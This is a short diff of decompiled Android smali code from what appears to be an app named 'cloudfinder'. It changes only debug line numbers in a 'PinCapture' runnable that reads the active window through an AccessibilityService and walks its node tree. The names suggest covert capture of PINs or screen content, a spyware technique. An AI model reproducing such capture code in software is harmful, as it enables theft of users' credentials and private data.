@@ -21,7 +21,7 @@
 .method constructor <init>()V
     .locals 0
 
-    .line 397
+    .line 418
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
     return-void
@@ -32,7 +32,7 @@
 .method public run()V
     .locals 3
 
-    .line 400
+    .line 421
     invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$600()Z
 
     move-result v0
@@ -41,7 +41,7 @@
 
     return-void
 
-    .line 402
+    .line 423
     :cond_0
     :try_start_0
     invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$700()Landroid/accessibilityservice/AccessibilityService;
@@ -50,7 +50,7 @@
 
     if-eqz v0, :cond_1
 
-    .line 404
+    .line 425
     invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
 
     move-result-object v0
@@ -59,15 +59,15 @@
 
     const/4 v1, 0x0
 
-    .line 406
+    .line 427
     invoke-static {v0, v1}, Lcom/lite/cloudfinder/pin/PinCapture;->access$800(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
 
-    .line 407
+    .line 428
     invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
     :try_end_0
     .catchall {:try_start_0 .. :try_end_0} :catchall_0
 
-    .line 412
+    .line 433
     :catchall_0
     :cond_1
     invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$600()Z
